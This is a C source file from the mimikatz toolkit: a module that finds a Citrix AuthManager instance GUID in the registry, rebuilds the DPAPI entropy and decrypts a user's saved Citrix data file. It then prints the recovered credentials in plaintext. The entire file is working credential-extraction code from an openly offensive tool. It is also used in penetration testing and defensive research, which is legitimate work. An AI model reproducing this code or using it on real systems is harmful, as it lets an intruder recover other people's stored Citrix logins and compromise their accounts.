/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_citrix.h"

const char CITRIX_SAVED_CREDENTIALS_GUID[] = "{921BB3E1-15EE-4bbe-83D4-C4CE176A481B}";
NTSTATUS kuhl_m_dpapi_citrix(int argc, wchar_t * argv[])
{
	PKULL_M_REGISTRY_HANDLE hRegistry;
	PBYTE pbData;
	DWORD cbData;
	LPCWSTR szData;
	LPWSTR szGuid = NULL, szUrl, szBase64, szSavedCreds;
	LPSTR sEntropy;
	IXMLDOMDocument *pXMLDom;
	IXMLDOMNode *pNode;
	LPVOID pDataOut;
	DWORD dwDataOutLen;

	if(kull_m_string_args_byName(argc, argv, L"guid", &szData, NULL))
	{
		kull_m_string_copy(&szGuid, szData);
	}
	else if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry)) // todo: offline
	{
		//For v3, KEY_WOW64_32KEY
		kull_m_registry_OpenAndQueryWithAlloc(hRegistry, HKEY_LOCAL_MACHINE, L"SOFTWARE\\"
		#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64			
			L"WOW6432Node\\"
		#endif
			L"Citrix\\AuthManager", L"Guid", NULL, (LPVOID *) &szGuid, NULL);
		kull_m_registry_close(hRegistry);
	}

	if(szGuid)
	{
		kprintf(L"Citrix instance GUID : %s\n", szGuid);

		if(kull_m_string_args_byName(argc, argv, L"in", &szData, NULL))
		{
			kprintf(L"Using saved data from: %s\n", szData);
			if(pXMLDom = kull_m_xml_CreateAndInitDOM())
			{
				if(kull_m_xml_LoadXMLFile(pXMLDom, szData))
				{
					if((IXMLDOMDocument_selectSingleNode(pXMLDom, (BSTR) L"//Data/Item", &pNode) == S_OK) && pNode)
					{
						szUrl = kull_m_xml_getAttribute(pNode, L"url");
						if(szUrl)
						{
							kprintf(L"URL: %s\n", szUrl);
							kull_m_string_sprintfA(&sEntropy, "%S%s%S", szUrl, CITRIX_SAVED_CREDENTIALS_GUID, szGuid);
							if(sEntropy)
							{
								if(IXMLDOMNode_get_text(pNode, &szBase64) == S_OK)
								{
									if(kull_m_string_quick_base64_to_Binary(szBase64, &pbData, &cbData))
									{
										if(kuhl_m_dpapi_unprotect_raw_or_blob(pbData, cbData, NULL, argc, argv, sEntropy, lstrlenA(sEntropy), &pDataOut, &dwDataOutLen, NULL))
										{
											if(kull_m_string_copy_len(&szSavedCreds, (LPCWSTR) pDataOut, dwDataOutLen / sizeof(wchar_t)))
											{
												UrlUnescapeInPlace(szSavedCreds, 0);
												kprintf(L" > Saved data: %s\n", szSavedCreds);
												LocalFree(szSavedCreds);
											}
											LocalFree(pDataOut);
										}
									}
									SysFreeString(szBase64);
								}
								LocalFree(sEntropy);
							}
							LocalFree(szUrl);
						}
					}
				}
				kull_m_xml_ReleaseDom(pXMLDom);
			}
		}
		else PRINT_ERROR(L"Input Citrix saved data needed (/in:%%localappdata%%\\Citrix\\AuthManager\\Data\\<file.dat>)\n");
		LocalFree(szGuid);
	}
	else PRINT_ERROR(L"No instance GUID ? (use /guid:xxx (without {} to specify\n");

	return STATUS_SUCCESS;
}